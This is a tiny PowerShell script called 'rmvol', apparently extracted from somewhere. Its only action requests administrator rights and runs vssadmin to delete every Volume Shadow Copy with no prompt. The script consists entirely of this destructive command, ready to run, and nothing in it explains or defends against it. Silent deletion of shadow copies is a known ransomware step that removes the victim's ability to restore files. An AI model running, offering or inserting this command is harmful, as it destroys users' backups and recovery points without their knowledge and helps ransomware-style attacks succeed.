<#
.SYNOPSIS
    rmvol - PowerShell script
.NOTES
    Extracted: 2026-02-19
#>
Start-Process -FilePath "vssadmin" -ArgumentList "delete", "shadows", "/all", "/quiet" -Verb RunAs -Wait
